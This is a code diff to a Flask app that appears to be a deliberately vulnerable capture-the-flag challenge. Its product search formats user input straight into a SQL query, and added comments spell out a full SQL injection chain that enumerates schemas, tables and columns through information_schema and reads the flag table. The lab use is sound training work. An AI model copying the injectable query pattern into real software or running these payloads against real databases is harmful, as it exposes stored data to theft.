@@ -1,3 +1,5 @@
+import sys
+
 from flask import Flask, render_template
 from flask_bootstrap import Bootstrap
 from flask_wtf import FlaskForm
@@ -30,11 +32,23 @@ class DBQueryForm(FlaskForm):
 
 
 def query_db(query: str) -> list:
+    #
+    #       HOW TO GET THE FLAG, ONE POSSIBILITY AS FOLLOWS:
+    #
     # possible injection to display all products:
-    #            %' or 'a'='a'; --
+    #            %' or 'a'='a'; #
+    # how to get database names:
+    #            %' or 'a'='a union select group_concat(schema_name) from information_schema.schemata; #
+    # how to get table names:
+    #            %' or 'a'='a' union select group_concat(table_name) from information_schema.tables  where table_schema='flask'; #
+    # get column names of table 'flag':
+    #            %' or 'a'='a' union select group_concat(column_name) from information_schema.columns  where table_name='flag'; #
+    # get flag itself
+    #            %' or 'a'='a' union select group_concat(flag) from flask.flag; #
+    query = """SELECT imagefile FROM products where lower(productname) like '%{}%'""".format(query)
+    cursor = db.cursor()
     try:
-        query = """SELECT imagefile FROM products where lower(productname) like '%{}%'""".format(query)
-        cursor = db.cursor()
+        #print(query)
         cursor.execute(query)
         result = cursor.fetchall()
         result_list = list()
@@ -42,6 +56,10 @@ def query_db(query: str) -> list:
             result_list.append(element[0])
     except Exception:
         result_list = ["Stop it script kiddy"]
+        print(sys.exc_info())
+    # always close cursor, no matter if an exception occurred or not
+    finally:
+        cursor.close()
 
     return result_list
     
